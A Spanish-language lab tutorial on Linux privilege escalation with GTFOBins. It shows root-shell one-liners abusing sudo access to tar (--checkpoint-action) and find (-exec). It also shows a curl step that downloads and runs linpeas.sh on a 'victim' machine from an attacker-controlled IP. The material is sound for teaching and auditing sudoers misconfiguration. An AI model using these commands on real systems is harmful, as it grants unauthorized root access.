
---
# Laboratorio de escalada de privilegios mediante GTFOBins

> `GTFOBins` es una base de datos de binarios disponibles en sistemas Unix que pueden ser explotados por atacantes locales para escalar privilegios, ejecutar comandos arbitrarios, leer archivos sensibles o incluso establecer shells inversas.

En esta parte del laboratorio vamos a aprender a utilizar GTFOBins para identificar comandos que podemos aprovechar cuando el usuario tiene acceso a ciertos binarios a través de `sudo`.

---

## 1. Qué es GTFOBins y para qué sirve

**GTFOBins (Get The F*** Out Binaries)** es un recurso utilizado en auditorías de seguridad ofensiva para identificar binarios comunes que pueden ser usados maliciosamente cuando están mal configurados o cuando se ejecutan como parte de privilegios `sudo`.

- Sitio oficial: https://gtfobins.github.io

En cada binario listado, GTFOBins documenta posibles formas de explotación en categorías como:

- `sudo`: si el binario puede ser explotado si está en el archivo sudoers.
- `shell`: si permite obtener una shell.
- `file-read`: si permite leer archivos arbitrarios.
- `file-write`: si permite escribir o sobrescribir archivos.
- `reverse-shell`: si permite establecer una conexión inversa al atacante.

---

## 2. Escenario de uso: Metahumo con acceso sudo a `tar`

**Acción (como root):**

```bash
nano /etc/sudoers
````

Añadir:

```bash
Metahumo ALL=(ALL) NOPASSWD: /bin/tar
```

**Explicación:**  
Permitimos que el usuario `Metahumo` ejecute `tar` como root sin necesidad de introducir contraseña.

**Acción (como Metahumo):**

```bash
su Metahumo
sudo -l
```

**Resultado:**

```bash
Matching Defaults entries for Metahumo on <hostname>:
    env_reset, mail_badpass, secure_path=...

User Metahumo may run the following commands on <hostname>:
    (ALL) NOPASSWD: /bin/tar
```

**Explicación:**  
Confirmamos que tenemos permisos para ejecutar el binario `/bin/tar` con privilegios.

---

## 3. Búsqueda del binario en GTFOBins

**Acción (en navegador o terminal con curl):**

Ir a:

```
https://gtfobins.github.io/gtfobins/tar/
```

O usar `curl`:

```bash
curl -s https://gtfobins.github.io/gtfobins/tar/ | grep 'sudo'
```

**Explicación:**  
Accedemos a la página del binario `tar` en GTFOBins, donde se documenta cómo abusar de este binario cuando se ejecuta vía `sudo`.

---

## 4. Explotación con `tar`

**Acción (como Metahumo):**

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
Utilizamos una función especial de `tar` (`--checkpoint-action`) que permite ejecutar un comando del sistema tras cierto número de archivos procesados. En este caso, ejecutamos `/bin/bash` como root.

---

## 5. Repetición del proceso con otro binario: `find`

**Acción (como root):**

```bash
nano /etc/sudoers
```

Añadir:

```bash
Metahumo ALL=(ALL) NOPASSWD: /usr/bin/find
```

**Acción (como Metahumo):**

```bash
sudo find . -exec /bin/bash \;
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
`find` permite ejecutar comandos con `-exec`. Al estar bajo `sudo`, ese comando (`/bin/bash`) se ejecuta con privilegios de root.

---

## 6. Automatizando la búsqueda con `linpeas` o script manual

**Opción 1: [[LinPEAS]]**

Subimos y ejecutamos `linpeas.sh` en la máquina víctima para detectar automáticamente binarios sudo explotables.

```bash
curl http://IP_local:1234/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Opción 2: script manual**

```bash
sudo -l | cut -d ':' -f2 | tr ',' '\n' | xargs -I{} basename {} | while read bin; do echo "$bin:"; curl -s https://gtfobins.github.io/gtfobins/$bin/ | grep 'sudo' && echo; done
```

**Explicación:**  
Este script revisa los binarios disponibles para `sudo` y los busca en GTFOBins para ver si existe una técnica conocida de escalada.

---

## 7. Conclusiones y buenas prácticas

- GTFOBins es una herramienta fundamental para la post-explotación cuando se dispone de acceso a comandos vía `sudo`.
    
- Muchos binarios comunes pueden ser vectores de escalada de privilegios si se configuran mal en el archivo sudoers.
    
- Se recomienda evitar el uso de `NOPASSWD` salvo en situaciones muy controladas.
    
- Nunca se deben incluir binarios con capacidad de ejecución de comandos o intérpretes de forma directa sin auditoría de riesgos.
    

---

